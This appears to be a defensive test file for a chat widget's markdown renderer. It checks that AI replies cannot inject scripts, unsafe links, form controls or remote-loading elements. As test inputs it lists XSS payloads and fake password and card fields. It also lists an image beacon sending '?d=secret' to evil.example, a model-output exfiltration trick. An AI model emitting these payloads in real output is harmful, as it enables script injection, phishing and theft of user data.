// tests/markdown.spec.ts — what must be true of any rendered reply.
// Created 2026-07-15 (A3 glass bar) as the DOMPurify allowlist pin.
//
// 2026-09-27 (native renderer): rewritten. There is no allowlist to pin any
// more: replies parse into a tree (lib/md/) drawn with text bindings, and the
// node kinds are the only elements that can appear. So these tests render real
// replies through Markdown.svelte and assert on the DOM:
//   • every payload the old spec pinned (injected targets, javascript: and
//     other bad hrefs, image/style/input/background beacons, the C1 table
//     payloads, SVG/MathML, removal order) stays inert;
//   • the set of elements and attributes a reply can produce is a subset of the
//     old allowlist, over the parity corpus, the hostile payloads and a fuzz run;
//   • site-relative links still resolve against the host origin (setLinkBase);
//   • parseSegments still splits fences, cards and the streaming shimmer.
// Behaviour change pinned here: a raw `<input type="checkbox">` written as HTML
// is dropped (only a markdown task item makes a checkbox now).

import { describe, it, expect, afterEach } from 'vitest';
import { mount, unmount, flushSync } from 'svelte';
import Markdown from '../src/components/Markdown.svelte';
import { parseSegments, setLinkBase } from '../src/lib/markdown';
import { CORPUS } from './fixtures/md-corpus';

const mounted: ReturnType<typeof mount>[] = [];
afterEach(() => {
  for (const m of mounted.splice(0)) unmount(m);
  document.body.innerHTML = '';
  setLinkBase(null);
});

function render(md: string): HTMLElement {
  const target = document.createElement('div');
  document.body.append(target);
  mounted.push(mount(Markdown, { target, props: { content: md } }));
  flushSync();
  return target.querySelector('.pawbar-md') as HTMLElement;
}

// What the old DOMPurify allowlist let through (MARKDOWN_ALLOWED_TAGS), minus
// span, which the native renderer never emits.
const ALLOWED_TAGS = new Set([
  'p', 'br', 'strong', 'em', 'del', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'blockquote', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'code', 'pre', 'hr', 'sup', 'sub',
  'div', 'input',
]);
// The old ALLOWED_ATTR plus the target/rel the link hook set, plus the class on
// the table wrapper (and the root) that the old path also wrote.
const ALLOWED_ATTR = new Set(['href', 'align', 'start', 'type', 'disabled', 'checked', 'target', 'rel', 'class']);
const SAFE_SCHEME = /^(https?:|mailto:|tel:)/i;

/** Everything that must hold for any rendered reply. Returns the root. */
function assertInert(root: HTMLElement): HTMLElement {
  for (const el of root.querySelectorAll('*')) {
    const tag = el.tagName.toLowerCase();
    expect(ALLOWED_TAGS.has(tag), `unexpected <${tag}>`).toBe(true);
    for (const a of el.attributes) expect(ALLOWED_ATTR.has(a.name), `unexpected ${a.name} on <${tag}>`).toBe(true);
    if (tag === 'div') expect(el.className).toBe('pawbar-table-wrapper');
    if (tag === 'input') {
      expect(el.getAttribute('type')).toBe('checkbox');
      expect(el.hasAttribute('disabled')).toBe(true);
    }
    if (tag === 'a') {
      expect(el.getAttribute('target')).toBe('_blank');
      expect(el.getAttribute('rel')).toBe('noopener noreferrer');
      const href = el.getAttribute('href');
      if (href !== null) expect(href, `unsafe href ${href}`).toMatch(SAFE_SCHEME);
    }
  }
  return root;
}

describe('reply links leave the widget, never the customer page', () => {
  for (const target of ['_top', '_parent', '_self']) {
    it(`rewrites an injected target="${target}" to _blank + noopener`, () => {
      const a = render(`<a href="https://evil.example" target="${target}" rel="opener">Returns policy</a>`).querySelector('a')!;
      expect(a.getAttribute('target')).toBe('_blank');
      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
    });
  }

  it('gives a plain markdown link target=_blank + noopener', () => {
    const a = render('[Returns](https://site.example/returns)').querySelector('a')!;
    expect(a.getAttribute('href')).toBe('https://site.example/returns');
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toBe('noopener noreferrer');
  });

  for (const href of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'jav&#x09;ascript:alert(1)']) {
    it(`drops a ${href.slice(0, 12)} href entirely (html and markdown)`, () => {
      expect(render(`<a href="${href}">x</a>`).querySelector('a')!.hasAttribute('href')).toBe(false);
      expect(render(`[x](${href})`).querySelector('a')!.hasAttribute('href')).toBe(false);
    });
  }

  for (const href of ['/returns', '//evil.example/x', 'ftp://files.example/x', 'data:text/html,hi', 'vbscript:x']) {
    it(`drops a non-allowlisted href (${href})`, () => {
      expect(render(`<a href="${href}">x</a>`).querySelector('a')!.hasAttribute('href')).toBe(false);
    });
  }

  for (const href of ['mailto:help@site.example', 'tel:+15551234567', 'http://site.example/x']) {
    it(`keeps an allowlisted href (${href})`, () => {
      const a = render(`<a href="${href}">x</a>`).querySelector('a')!;
      expect(a.getAttribute('href')).toBe(href);
      expect(a.getAttribute('target')).toBe('_blank');
    });
  }

  it('an autolink with a bad scheme renders without an href', () => {
    const a = render('<javascript:alert(1)>').querySelector('a');
    if (a) expect(a.hasAttribute('href')).toBe(false);
  });
});

describe('model output cannot load remote resources', () => {
  it('a markdown image renders no <img> (alt text only)', () => {
    const root = render('Look: ![a cat](https://evil.example/p?d=secret)');
    expect(root.querySelector('img')).toBeNull();
    expect(root.textContent).toContain('a cat');
  });

  it('a linked image degrades to a normal link around the alt text', () => {
    const a = render('[![Logo](https://evil.example/l.png)](https://site.example)').querySelector('a')!;
    expect(a.getAttribute('href')).toBe('https://site.example');
    expect(a.textContent).toBe('Logo');
  });

  for (const raw of [
    '<img src="https://evil.example/p.png">',
    '<p style="background:url(https://evil.example/s)">x</p>',
    '<input type="image" src="https://evil.example/i">',
    '<table><tr><td background="https://evil.example/b">x</td></tr></table>',
    '<video src="https://evil.example/v"></video>',
    '<audio src="https://evil.example/a"></audio>',
    '<object data="https://evil.example/o"></object>',
    '<link rel="stylesheet" href="https://evil.example/c.css">',
  ]) {
    it(`loads nothing: ${raw.slice(0, 40)}`, () => {
      assertInert(render(raw));
    });
  }
});

describe('hostile payloads stay inert', () => {
  for (const p of [
    'Hello <script>alert(1)</script> world',
    '<a href="javascript:alert(1)" onclick="steal()">x</a>',
    '<a title="<table onmouseover=alert(1) tabindex=0 autofocus onfocus=alert(2) x=">T</a>',
    '[x](https://a.example "<table onmouseover=alert(1) x=")',
    '<a href="https://a.example" title="</table><img src=x onerror=alert(3)>">T</a>',
    '<a href="https://a.example/?<table onmouseover=alert(1) x=">T</a>',
    '<svg><a target="_top" href="https://evil.example">x</a></svg>',
    '<svg><a xlink:href="javascript:alert(1)">x</a></svg>',
    '<math><mi><a target="_top" href="https://evil.example">x</a></mi></math>',
    '<iframe src="https://evil.example"></iframe>',
    '<form action="https://evil.example"><button>Pay</button></form>',
    '<style>body{display:none}</style>visible',
    '<div onmouseover="alert(1)">hover</div>',
    '<details open ontoggle=alert(1)>x</details>',
    '<a href="https://a.example" aria-label="Safe" data-x="y">Deceptive</a>',
    '[a](https://a.example)<input type="text"><a href="https://b.example" target="_top">b</a>',
  ]) {
    it(`stays inert: ${p.slice(0, 48)}`, () => {
      const root = assertInert(render(p));
      expect(root.querySelector('script, style, iframe, svg, math, img, form, button')).toBeNull();
    });
  }

  it('drops script and style content, not just the tags', () => {
    const root = render('Hello <script>alert(1)</script> <style>body{}</style>world');
    expect(root.textContent).not.toContain('alert');
    expect(root.textContent).not.toContain('body{}');
  });

  it('keeps both links around a dropped input', () => {
    const links = render('<a href="https://a.example" target="_top">1</a><input type="text"><a href="https://b.example" target="_top">2</a>').querySelectorAll('a');
    expect(links.length).toBe(2);
  });
});

describe('inputs: task checkboxes only', () => {
  it('keeps a GFM task checkbox, disabled, with its checked state', () => {
    const inputs = render('- [x] done\n- [ ] todo').querySelectorAll('input');
    expect(inputs.length).toBe(2);
    expect([...inputs].map((i) => i.checked)).toEqual([true, false]);
    for (const i of inputs) expect(i.hasAttribute('disabled')).toBe(true);
  });

  for (const raw of [
    '<input type="checkbox">',
    '<input type="text" value="card number">',
    '<input type="password">',
    '<input type="submit" value="Pay">',
    '<textarea>x</textarea>',
    '<select><option>x</option></select>',
  ]) {
    it(`renders no form control for raw HTML (${raw})`, () => {
      expect(render(raw).querySelector('input, textarea, select')).toBeNull();
    });
  }
});

describe('site-relative links resolve against the host page origin', () => {
  it('resolves a root-relative link against parentOrigin', () => {
    setLinkBase('https://shop.example');
    expect(render('[Returns](/returns)').querySelector('a')!.getAttribute('href')).toBe('https://shop.example/returns');
  });

  it('resolves a plain-relative link against parentOrigin', () => {
    setLinkBase('https://shop.example');
    expect(render('[Returns](returns?x=1#faq)').querySelector('a')!.getAttribute('href')).toBe(
      'https://shop.example/returns?x=1#faq',
    );
  });

  for (const href of ['//evil.example/x', '/\\evil.example/x', '\\\\evil.example/x', 'ftp://x.example', 'javascript:alert(1)']) {
    it(`still drops ${href} even with a base`, () => {
      setLinkBase('https://shop.example');
      expect(render(`<a href="${href}">x</a>`).querySelector('a')!.hasAttribute('href')).toBe(false);
    });
  }

  for (const href of ['#faq', '?q=1', '']) {
    it(`drops a fragment/query-only/empty href (${JSON.stringify(href)})`, () => {
      setLinkBase('https://shop.example');
      expect(render(`<a href="${href}">x</a>`).querySelector('a')!.hasAttribute('href')).toBe(false);
    });
  }

  for (const ok of ['https://shop.example:443', 'https://shop.example/', 'http://localhost:5173']) {
    it(`normalises an equivalent origin (${ok})`, () => {
      setLinkBase(ok);
      expect(render('[Returns](/returns)').querySelector('a')!.getAttribute('href')).toBe(`${new URL(ok).origin}/returns`);
    });
  }

  for (const bad of ['*', '', 'not a url', 'https://shop.example/path', 'https://shop.example/?q=1', 'https://shop.example/#x', 'javascript:alert(1)', 'file:///etc']) {
    it(`drops relative links when parentOrigin is invalid (${JSON.stringify(bad)})`, () => {
      setLinkBase(bad);
      expect(render('[Returns](/returns)').querySelector('a')!.hasAttribute('href')).toBe(false);
    });
  }
});

describe('what a reply can produce', () => {
  it('stays inside the old allowlist over the whole parity corpus', () => {
    for (const md of Object.values(CORPUS)) assertInert(render(md));
  });

  // No ``` token: a fence renders CodeBlock (app chrome with its own copy
  // button, covered by its own tests), not the markdown path fuzzed here.
  it('never throws and stays inside the allowlist on random markdown', () => {
    const TOKENS = [
      '*', '**', '_', '__', '~', '~~', '`', '[', ']', '(', ')', '![', '<', '>', '</', '<a href="', '"',
      'javascript:', 'https://x.example', 'www.x.example', 'a@b.example', '&amp;', '&#x', ';', '\\', '|', '---',
      '\n', '\n\n', '  ', '# ', '- ', '1. ', '> ', '[x] ', '<script>', '<img src=x onerror=1>', 'text', 'word',
      ':', '-', '|---|', '<br>', '<sup>', '</sup>', '<!--', '-->', 'onload=', '\t',
    ];
    let seed = 7;
    const rand = () => ((seed = (seed * 1103515245 + 12345) % 2 ** 31) / 2 ** 31);
    for (let n = 0; n < 300; n++) {
      const len = 1 + Math.floor(rand() * 40);
      const md = Array.from({ length: len }, () => TOKENS[Math.floor(rand() * TOKENS.length)]).join('');
      assertInert(render(md));
      for (const m of mounted.splice(0)) unmount(m);
      document.body.innerHTML = '';
    }
  });
});

describe('parseSegments', () => {
  it('splits prose and a fenced code block', () => {
    const segs = parseSegments('Try this:\n```js\nconst x = 1;\n```\nDone.');
    expect(segs.map((s) => s.type)).toEqual(['md', 'code', 'md']);
    const code = segs.find((s) => s.type === 'code');
    expect(code && 'code' in code && code.code).toContain('const x = 1;');
  });

  it('routes a pawbar-card fence to the card layer', () => {
    const segs = parseSegments('Here:\n```pawbar-card\n{"kind":"product","items":[]}\n```');
    expect(segs.map((s) => s.type)).toEqual(['md', 'card']);
  });

  it('masks an in-flight unclosed fence while streaming', () => {
    expect(parseSegments('Here is code:\n```python\nprint(', true).map((s) => s.type)).toEqual(['md', 'code-loading']);
  });

  it('does not mask the unclosed fence when not streaming', () => {
    const segs = parseSegments('Here is code:\n```python\nprint(', false);
    expect(segs.every((s) => s.type === 'md')).toBe(true);
  });

  it('reuses unchanged blocks while a reply streams, so only the last one re-renders', () => {
    const first = parseSegments(['Intro paragraph.', '', '- one', '- tw'].join('\n'), true);
    const next = parseSegments(['Intro paragraph.', '', '- one', '- two', '- thr'].join('\n'), true);
    const blocks = (s: typeof first) => (s[0] as { type: 'md'; blocks: unknown[] }).blocks;
    expect(blocks(next)[0]).toBe(blocks(first)[0]);
    expect(blocks(next)[1]).not.toBe(blocks(first)[1]);
  });

  it('does not reuse a block across a link-base change', () => {
    setLinkBase('https://a.example');
    const a = parseSegments('[r](/returns)');
    setLinkBase('https://b.example');
    const b = parseSegments('[r](/returns)');
    expect(JSON.stringify(b)).toContain('https://b.example/returns');
    expect(JSON.stringify(a)).toContain('https://a.example/returns');
  });

  it('drops whitespace-only prose', () => {
    expect(parseSegments('   \n\n  ')).toEqual([]);
  });
});
